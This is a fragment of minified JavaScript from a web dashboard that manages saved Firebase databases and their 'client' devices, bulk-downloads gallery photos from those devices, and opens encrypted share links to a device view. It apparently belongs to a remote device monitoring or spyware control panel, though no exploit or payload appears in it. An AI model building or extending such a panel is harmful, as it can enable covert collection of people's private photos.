function toggleGallerySelect(el){const idx=el.dataset.idx;if(gallerySelected.has(idx)){gallerySelected.delete(idx);el.style.border='2px solid transparent';}else{gallerySelected.add(idx);el.style.border='2px solid var(--cyan)';}updateGalleryCount();$('galleryFooter').style.display=gallerySelected.size>0?'flex':'none';}
function updateGalleryCount(){const c=gallerySelected.size,t=galleryIds.length;const el=$('galCount');if(el) el.innerText=c+' / '+t+' selected';const fc=$('galFooterCount');if(fc) fc.innerText=c;}
function cancelGallery(){gallerySelected.clear();document.querySelectorAll('.gal-item').forEach(el=>el.style.border='2px solid transparent');updateGalleryCount();const f=$('galleryFooter');if(f) f.style.display='none';}
function extFromSrc(src,kind){if(kind==='url'){const m=src.match(/\.(jpg|jpeg|png|gif|webp)(\?|#|$)/i);if(m) return m[1].toLowerCase();}const m=src.match(/^data:image\/([a-z0-9+]+)/i);if(m){const t=m[1].toLowerCase();return t==='jpeg'?'jpg':t.split('+')[0];}return 'jpg';}
async function saveSelectedGallery(){
  if(gallerySelected.size===0) return toast("Select photos first");
  const idxs=Array.from(gallerySelected);let ok=0,fail=0;
  for(let i=0;i<idxs.length;i++){
    const idx=idxs[i];const img=galleryIds[parseInt(idx)];if(!img) continue;
    const ext=extFromSrc(img.src,img.kind);const name='gallery_'+(activeDevice?activeDevice.id.slice(0,6):'img')+'_'+idx+'.'+ext;
    try{const res=await fetch(img.src,{mode:'cors'});if(!res.ok) throw new Error('http '+res.status);const blob=await res.blob();const href=URL.createObjectURL(blob);const a=document.createElement('a');a.href=href;a.download=name;document.body.appendChild(a);a.click();document.body.removeChild(a);setTimeout(()=>URL.revokeObjectURL(href),4000);ok++;}
    catch(e){try{if(img.kind==='url') window.open(img.src,'_blank','noopener');else{const a=document.createElement('a');a.href=img.src;a.download=name;document.body.appendChild(a);a.click();document.body.removeChild(a);}ok++;}catch(e2){fail++;}}
    await new Promise(r=>setTimeout(r,450));
  }
  toast("✅ "+ok+" saved"+(fail?' • '+fail+' failed':''));cancelGallery();
}

// ═══════════════════════════════════════════
//  DEAD FIREBASE CLEANUP (via backend)
// ═══════════════════════════════════════════
async function scanDeadFirebases(){
  if(scanRunning) return toast("Scan already running...");
  if(!savedDbs.length) return toast("No saved accounts");
  scanRunning=true;const btn=$('btnScanDead');btn.disabled=true;btn.innerHTML='<span class="mini-spin"></span> Scanning...';
  const log=$('cleanupLog');log.style.display='block';log.innerHTML='🔍 Scanning '+savedDbs.length+' Firebase(s)...\n\n';
  deadDbs=[];let alive=0,dead=0,errors=0,empty=0;
  for(const db of savedDbs){
    const cleanUrl=db.url.replace(/\/+$/,'');const shortName=cleanUrl.replace('https://','').split('.')[0];
    try{
      const r = await backendCall("fb_probe_db", { dbUrl: cleanUrl, dbKey: db.key });
      if(!r || !r.ok){
        const isAuth = r && (r.status===401||r.status===403);
        deadDbs.push({url:db.url,key:db.key,reason:'HTTP '+(r?r.status:'ERR'),type:isAuth?'auth':'dead'});
        if(isAuth) errors++;else dead++;
        log.innerHTML+='<div style="color:var(--danger)">✗ '+shortName+' — HTTP '+(r?r.status:'ERR')+'</div>';
      }else{
        const data = await yn(cleanUrl, db.key, "clients");
        if(!data||typeof data!=='object'||Object.keys(data).length===0){deadDbs.push({url:db.url,key:db.key,reason:'Empty',type:'empty'});empty++;log.innerHTML+='<div style="color:var(--warn)">⚠ '+shortName+' — Empty</div>';}
        else{alive++;log.innerHTML+='<div style="color:var(--green)">✓ '+shortName+' — '+Object.keys(data).length+' devices</div>';}
      }
    }catch(e){deadDbs.push({url:db.url,key:db.key,reason:e.message,type:'dead'});dead++;log.innerHTML+='<div style="color:var(--danger)">✗ '+shortName+' — '+e.message+'</div>';}
    log.scrollTop=log.scrollHeight;$('cleanupBadge').textContent=alive+' alive / '+(dead+errors+empty)+' dead';await new Promise(r=>setTimeout(r,100));
  }
  log.innerHTML+='\n<span style="color:var(--cyan);font-weight:700;">✅ Done — '+alive+' alive, '+dead+' dead, '+errors+' auth errors, '+empty+' empty</span>';
  $('cleanupBadge').textContent=deadDbs.length+' dead / '+alive+' alive';$('deadCountInline').textContent=deadDbs.length;
  $('btnRemoveDead').style.display=deadDbs.length>0?'flex':'none';
  btn.disabled=false;btn.innerHTML='🔍 Re-Scan';scanRunning=false;log.scrollTop=log.scrollHeight;
}
function removeAllDeadFirebases(){
  if(!deadDbs.length) return toast("No dead Firebase to remove");
  if(!confirm("⚠ Remove "+deadDbs.length+" dead Firebase(s)?\n\nThey'll be saved to Removed History.")) return;
  const now=Date.now();
  deadDbs.forEach(d=>removedDbsLog.push({url:d.url,key:d.key,reason:d.reason,type:d.type,removedAt:now}));
  removedDbsLog=removedDbsLog.slice(-300);localStorage.setItem('rajxweb_removed_dbs',JSON.stringify(removedDbsLog));
  const removedUrls=new Set(deadDbs.map(d=>d.url));savedDbs=savedDbs.filter(db=>!removedUrls.has(db.url));
  localStorage.setItem('rajxweb_saved_dbs',JSON.stringify(savedDbs));
  $('removedCountInline').textContent=removedDbsLog.length;$('cleanupLog').innerHTML+='<br><span style="color:var(--green);font-weight:700;">🗑 Removed '+deadDbs.length+' dead Firebase(s)</span>';
  $('btnRemoveDead').style.display='none';$('cleanupBadge').textContent=savedDbs.length+' saved';deadDbs=[];renderSavedDbs();toast("✅ Removed "+removedUrls.size+" dead Firebase");
}
function showRemovedLog(){
  const list=$('removedLogList');
  if(!removedDbsLog.length){list.innerHTML='<div style="text-align:center;color:var(--muted);padding:30px;">No removed history yet.</div>';}
  else{list.innerHTML=[...removedDbsLog].reverse().map(r=>'<div style="padding:10px;border-bottom:1px solid var(--line);font-size:11px;font-family:\'JetBrains Mono\',monospace;"><div style="color:var(--danger);word-break:break-all;margin-bottom:4px;">'+r.url+'</div><div style="color:var(--muted);font-size:10px;"><span style="color:var(--warn)">'+r.reason+'</span> • '+r.type.toUpperCase()+' • '+new Date(r.removedAt).toLocaleString('en-IN',{timeZone:'Asia/Kolkata'})+'</div></div>').join('');}
  $('removedLogModal').classList.add('active');
}
function clearRemovedLog(){if(!confirm("Clear all removed history?")) return;removedDbsLog=[];localStorage.removeItem('rajxweb_removed_dbs');$('removedCountInline').textContent='0';showRemovedLog();toast("History cleared");}

// ═══════════════════════════════════════════
//  SCHEDULER (same)
// ═══════════════════════════════════════════
function scheduleDailyRefresh(){
  setInterval(()=>{const now=new Date(Date.now()+IST_OFFSET);if(now.getUTCHours()===12&&now.getUTCMinutes()===0&&now.getUTCSeconds()===0){if(allDevices.length>0) fastRefresh();}},1000);
}

// ═══════════════════════════════════════════
//  INIT (same)
// ═══════════════════════════════════════════
if(localStorage.getItem('desktop_mode')==='true'){document.body.classList.add('desktop-mode');if($('desktopModeText')) $('desktopModeText').innerText="Mobile Mode";}
renderSavedDbs();
if($('removedCountInline')) $('removedCountInline').textContent=removedDbsLog.length;
if(lastSeenTicker) clearInterval(lastSeenTicker);
lastSeenTicker=setInterval(refreshLastSeenLabels,3000);

// ═══════════════════════════════════════════
//  SHARED LINK HANDLER (must be last)
// ═══════════════════════════════════════════
window.addEventListener('load',async()=>{
  initBombDrag();
  const params=new URLSearchParams(window.location.search);
  if(params.has('s')){
    const encryptedStr=params.get('s');
    const decryptedStr=await aesDecrypt(encryptedStr);
    if(decryptedStr){
      try{
        const payload=JSON.parse(decryptedStr);
        const url=payload.u||payload.url;const key=payload.k!==undefined?payload.k:(payload.key||"");
        const deviceId=payload.d||payload.deviceId;const exp=payload.e!==undefined?payload.e:payload.exp;
        if(exp&&Date.now()>exp){toast("This share link has expired!");return;}
        if(!url){toast("Invalid link");return;}
        isSharedLinkMode=true;
        currentDb={url:url.replace(/\/+$/,''),key,name:url.split('.')[0].replace('https://','')};
        if(deviceId) pendingAutoOpenDevice=deviceId;
        $('dashUrl').innerText="Connected";$('dbLabel').innerText="Connected";
        const shareBtn=$('shareBtn');if(shareBtn) shareBtn.style.display='none';
        $('connDot').style.background='var(--green)';
        switchMainTab('dashboard');
        loadRealData(currentDb,window.location.href);
        return;
      }catch(e){}
    }
    toast("Invalid or expired link");
  }
});